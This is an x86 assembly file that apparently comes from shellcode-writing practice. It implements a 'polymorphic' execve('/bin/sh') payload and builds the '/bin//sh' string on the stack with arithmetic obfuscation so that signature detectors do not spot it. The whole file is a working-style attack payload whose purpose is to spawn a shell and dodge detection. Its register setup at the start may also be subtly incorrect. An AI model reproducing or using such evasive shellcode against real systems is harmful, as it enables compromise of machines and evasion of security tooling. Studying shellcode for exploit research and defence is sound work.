; Date: 09/03/2019
; Polimorphic_Execve_Sh_Stack.asm
; Author: Daniele Votta
; Description: This program invoke a Polimorphic version of excve.
; JMP | CALL | POP | Techniques

; Polimorphic version of execve(bin/sh)

_start:
	xor ebx,eax
	xor eax,ebx
	mov ecx,eax
	push ecx
	
	mov edi,0x79844040	; 0x68732f2f +1
	sub edi,0x11111111
	mov dword [esp-4],edi

	mov edi, 0x6e69622f
	add edi,0x11111111
	sub edi,0x11111111
	mov dword [esp-8],edi
	sub esp,4
	sub esp,4
	
	mov ebx,esp
	push eax
	mov edx,esp

	push ebx
	mov ecx,esp

	mov al,1
	add al,10
	int 0x80
	

